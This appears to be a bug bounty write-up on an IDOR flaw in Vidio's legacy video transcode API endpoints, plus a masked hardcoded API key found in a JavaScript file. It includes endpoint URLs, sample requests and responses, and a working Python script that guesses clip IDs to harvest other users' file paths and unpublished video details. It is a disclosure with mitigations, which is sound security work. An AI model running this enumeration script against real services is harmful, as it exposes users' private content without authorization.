# Broken Access Control (IDOR) & Credential Leak at Legacy API Video Transcode


![](https://miro.medium.com/v2/resize:fit:700/1*ej2NqAjrJpAnCni-bNGAug.png)

Proof of Concept (PoC)

Hello everyone,

In this post, I will show you how I discovered a broken authentication and authorization vulnerability, known as Insecure Direct Object Reference (IDOR), at the Legacy API Video Transcode endpoints. Due to this vulnerability, attackers could access transcoding job information for all clips and videos, including those of internal staff users, by simply guessing numeric identifiers due to their auto-increment nature. Additionally, I found a hardcoded credential leak involving the transcode API key in a JavaScript file.

## What are insecure direct object references (IDOR)?

According to PortSwigger Web Security Academy, Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly. The term IDOR was popularized by its appearance in the OWASP 2007 Top Ten. However, it is just one example of many access control implementation mistakes that can lead to access controls being circumvented. IDOR vulnerabilities are most commonly associated with horizontal privilege escalation, but they can also arise in relation to vertical privilege escalation.

## Attack Scenario

When exploring the dashboard feature on Vidio, I noticed that the video upload is no longer available, I see a message “_Saat ini fitur unggah sedang dinonaktifkan. Mohon maaf atas ketidaknyamanannya._”

![](https://miro.medium.com/v2/resize:fit:700/1*Pp116V1YjCeivEBp8mawZA.png)

Video upload disabled

So I tried to analyze the JavaScript file (mostly manual) instead & found some interesting API endpoints:

1. https://www.vidio.com/clips/{{clip_id}}/transcode_job.json
2. https://www.vidio.com/dashboard/videos/transcode_job_status.json?job_id={{job_id}}
3. https://www.vidio.com/dashboard/videos/transcode_status.json?video_ids={{video_id}}

My assumption is these are legacy APIs that are used when users could upload video, but interestingly these endpoints can be used to fetch information from other users including internal Vidio users.

## What is Video Transcode?

According to AWS, Video transcoding is the process of converting video files from one format to another by adjusting parameters such as resolution, encoding, and bitrate. Video is increasingly important to organizations of all sizes as a method of connecting and communicating with end users. However, setting up optimum video workflows is challenging because of the diverse requirements for bandwidth and end-user devices. With video transcoding, you can create video files in multiple resolutions and bitrate options from the original video file. You can also optimize video quality, so end users have more options and more control over their viewing experience.

## Steps To Reproduce

> For the tools, we can use Chrome & Postman. First, we need to retrieve the authentication cookie `access_token`, `remember_user_token` & `_vidio_session`.

[1] Clips Transcode Job

Request:

GET https://www.vidio.com/clips/{{clip_id}}/transcode_job.json

Response:

{  
    "clip": {  
        "id": 3379622,  
        "video_id": 8015170,  
        "file_name": "ep_001_robot-20dan-20lansia_upload-daed",  
        "transcode_job_id": "ETS2f7da8fec8d588d50"  
    }  
}

Surprisingly, this endpoint doesn’t need authentication, so attackers don’t need to register to Vidio to use it. From the response, we could also see that it’s returning information:

1. `id`; clip ID
2. `video_id`; video ID associated with the clip
3. `file_name`; the original filename used when the user uploads the video
4. `transcode_job_id`; the transcode job ID

[2] Video Transcode Job Status

Request:

GET https://www.vidio.com/dashboard/videos/transcode_job_status.json?job_id={{job_id}}  
  
Headers:  
cookie: access_token={{access_token}}; remember_user_token={{remember_user_token}}; _vidio_session={{vidio_session}}

Response:

{  
    "id": 2708103,  
    "key": "uploads/8015170/ep_001_robot-20dan-20lansia_upload-daed.mp4",  
    "state": "Finished"  
}

From the response, we could also see that it’s returning information:

1. `id`; Internal ID
2. `key`; the original video file path
3. `state`; transcode job state

[3] Video Transcode Status

Request:

https://www.vidio.com/dashboard/videos/transcode_status.json?video_ids={{video_id}}  
  
Headers:  
cookie: access_token={{access_token}}; remember_user_token={{remember_user_token}}; _vidio_session={{vidio_session}}

Response:

[  
    {  
        "id": 8015170,  
        "status": true,  
        "published": false,  
        "transcode_status": "Finished"  
    }  
]

From the response, we could also see that it’s returning information:

1. `id`; video ID
2. `status`: transcode status
3. `published`: false
4. `transcode_status`; transcode status text (`Finished`, `Error`)

## PoC Code

I also created simple PoC code written in Python by using random 7 digits to guess the `clip_id`. So basically the flow is:

1. Get random 7 digits `clip_id`
2. Fetch the Clips Transcode Job by `clip_id`to get the `transcode_job_id` & `video_id`
3. Fetch the Video Transcode Job Status by `transcode_job_id`
4. Fetch the Video Transcode Status by `video_id`
5. Fetch the Video Detail by `video_id` to get the Publish Status, Title & Publish Date.

import requests  
import time  
from random import randint  
  
cookie = "access_token={{access_token}}; remember_user_token={{remember_user_token}}; _vidio_session={{_vidio_session}}"  
  
x_api_key = "{{x_api_key}}"  
  
def random_with_N_digits(n):  
    range_start = 10**(n-1)  
    # range_end = (10**n)-1  
    range_end = 4000000  
    return randint(range_start, range_end)  
  
while True:  
    t = time.localtime()  
    current_time = time.strftime("%H:%M:%S", t)  
    print(current_time)  
  
    # Get random 7 digits clip_id  
    clip_id = str(random_with_N_digits(7))  
    url = "https://www.vidio.com/clips/" + clip_id + "/transcode_job.json"  
  
    response = requests.get(  
        url=url,  
        headers={  
            'cookie': cookie  
        }  
    )  
  
    print("URL: " + url)  
    print("Response: " + response.text + "\n")  
  
    if response.status_code == 200:  
  
        # Get transcode job status by job_id  
        if response.json()['clip']['transcode_job_id'] != None:  
            transcode_job_id = response.json()['clip']['transcode_job_id']  
            url2 = "https://www.vidio.com/dashboard/videos/transcode_job_status.json?job_id=" + transcode_job_id  
            response2 = requests.get(  
                url=url2,  
                headers={  
                    'cookie': cookie  
                }  
            )  
            print("URL: " + url2)  
            print("Response: " + response2.text + "\n")  
  
        # Get transcode status by video_ids  
        if response.json()['clip']['video_id'] != None:  
            video_id = str(response.json()['clip']['video_id'])  
            url3 = "https://www.vidio.com/dashboard/videos/transcode_status.json?video_ids=" + video_id  
            response3 = requests.get(  
                url=url3,  
                headers={  
                    'cookie': cookie  
                }  
            )  
            print("URL: " + url3)  
            print("Response: " + response3.text + "\n")  
  
        # Get video publish status (published or draft)  
        if response.json()['clip']['video_id'] != None:  
            video_id = str(response.json()['clip']['video_id'])  
            url4 = "https://api.vidio.com/videos/" + video_id  
            response4 = requests.get(  
                url=url4,  
                headers={  
                    'cookie': cookie,  
                    'x-api-key': x_api_key  
                }  
            )  
            print("URL: " + url4)  
            if response4.status_code == 404:  
                print("Publish Status: Draft/ never published")  
            else:  
                video = response4.json()['videos'][0]  
                print("Publish Status: " + str(video['published']))  
                print("Title: " + video['title'])  
                print("Publish Date: " + video['publish_date'])  
  
    print("\n")  
    time.sleep(60)

We can save it as `poc.py` & run it with:

$ python poc.py

Run poc.py

## **Transcode API Key**

Just an additional information, I also found hardcoded credentials in the JS file:

VideoUploader: {  
    TRANSCODE_API_KEY: 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXX973',  
    TRANSCODER_ENGINE: 'aws',  
    DEBUG_UPLOADER: false,  
},

I haven’t found a way to use the key as of now, but if it’s not used anymore, I recommend removing it as well.

## Impact

The discovered vulnerabilities present several critical risks:

1. Unrestricted Access: Attackers could access all transcoding job details using easily guessable numeric identifiers.
2. Sensitive Information Exposure: Attackers may view sensitive information like filenames and video upload paths.
3. Detection of Unpublished Content: Attackers can identify unreleased content, undermining marketing strategies.
4. System Integrity Risks: Manipulation of transcoding data or publication statuses could destabilize the system.
5. Financial and Legal Implications: Leaks of exclusive content could lead to financial losses and legal actions.

## Mitigation

1. Perform proper authentication on the affected endpoints.
2. Perform proper authorization/ access control on the affected endpoints, e.g. only the owner of the video or administrator could access the information.
3. Consider removing the endpoints if this is a legacy API that is not used anymore.

## Conclusion

In summary, the exploration of the broken auth & credential leak vulnerability within the legacy video transcode feature highlights the importance of maintaining the legacy feature to keep the system secure. From the security researcher's point of view, it also highlights the importance of JS (JavaScript) code analysis for content discovery that could lead to finding vulnerabilities.
